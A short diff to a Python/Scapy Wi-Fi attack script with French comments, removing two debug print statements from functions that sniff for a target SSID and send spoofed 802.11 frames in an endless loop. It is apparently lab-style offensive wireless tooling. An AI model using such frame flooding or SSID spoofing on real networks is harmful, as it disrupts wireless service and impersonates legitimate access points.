@@ -24,7 +24,6 @@ def attack(packet_ssid, interface):
     frames.append(generateFrame(ssid, mac))
     print("Starting the attack.... (CTRL + C TO ABORT)")
     # On envoit les packets en boucle, à intervalle de 0.001
-    print(frames)
     sendp(frames, inter=0.001, iface=interface, loop=1)
 
 def generateFrame(wifiName, macAddr):
@@ -39,7 +38,6 @@ def scanSSIDs(packet):
     global packet_ssid
     # On recupere le ssid
     ssid = packet.getlayer(Dot11).info.decode("utf-8")
-    print(ssid)
     if ssid_wanted in ssid:
         packet_ssid = packet
 
